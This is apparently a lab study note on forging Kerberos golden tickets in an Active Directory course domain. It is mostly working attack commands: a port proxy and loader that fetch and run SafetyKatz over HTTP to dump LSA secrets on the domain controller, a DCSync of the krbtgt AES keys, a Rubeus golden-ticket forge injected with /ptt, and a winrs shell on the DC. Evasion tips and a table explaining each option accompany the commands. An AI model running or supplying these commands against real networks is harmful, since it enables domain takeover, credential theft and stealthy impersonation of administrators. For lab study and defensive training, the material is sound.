A golden ticket is signed and encrypted by the hash of krbtgt account
which makes it a valid TGT ticket. The krbtgt user hash could be used to impersonate any user with any privileges from even a non-domain machine.

> [!NOTE] **NOTE**
> As a good practice, it is recommended to change the password of the krbtgt account twice as password history is maintained for the account.
> 
> In real world environments, the krbtgt hash is rarely to never changed because who wants to fuck that up

Execute mimikatz (or a variant) on DC as DA to get krbtgt hash
```powershell
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.48

C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-lsa /patch" "exit"
```

Use DCSync to get AES keys for krbtgt account. This requires DA privileges (or a user that has replication rights on the domain object) and doesn't require RCE on the DC
```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
```


Use Rubeus to forge a Golden ticket command with attributes similar to a normal TGT - **AND ALWAYS TARGET AN ACTIVE DA** 
```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /printcmd
```

> [!NOTE] **IMPORTANT**
> Remember to add `/ptt` at the end of the generated command to inject the ticket into our current session

Now we can run the generated command which is OPSEC Friendly forge. 
```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe evasive-golden 
/aes256:<keys> /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:"11/11/2022 6:33:55 AM" /minpassage:1 /logoncount:2453 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt
```

```powershell
winrs -r:dcorp-dc cmd
```

```
154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848
```

| Option                                   | Description                                                                         |
| ---------------------------------------- | ----------------------------------------------------------------------------------- |
| golden                                   | Name of the module                                                                  |
| /aes256:154CB6624[SNIP]                  | AES256 keys of the krbtgt account. Using AES keys makes the attack more silent      |
| /user:Administrator                      | Username for which the TGT is generated                                             |
| /id:500                                  | User RID (retrieved from the DC) (Default 500)                                      |
| /pgid:513                                | Primary Group ID (retrieved from the DC) (Default 513)                              |
| /groups:544,512,520,513                  | Groups the user is a member of (retrieved from the DC) (Default 520,512,513,519,518 |
| /domain:dollarcorp.moneycorp.local       | FQDN of the domain (retrieved from the DC)                                          |
| /sid:S-1-5-21-71981[SNIP]                | SID of the current domain                                                           |
| /pwdlastset:"11/11/2022 6:33:55 AM"      | The PasswordLastSet for the user (retrieved from the DC)                            |
| /minpassage:1                            | “Minimum Password Age” in days (retrieved from the DC)                              |
| /logoncount:2453                         | Logon Count for the user (retrieved from the DC)                                    |
| /netbios:dcorp                           | NetBIOS name of the domain (retrieved from the DC)                                  |
| /dc:DCORP-DC.dollarcorp.moneycorp.local  | FQDN of the DC (retrieved from the DC)                                              |
| /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD | UserAccountControl Flags (retrieved from the DC)                                    |
| /ptt                                     | Inject in the current process                                                       |


![[Pasted image 20250508054121.png]]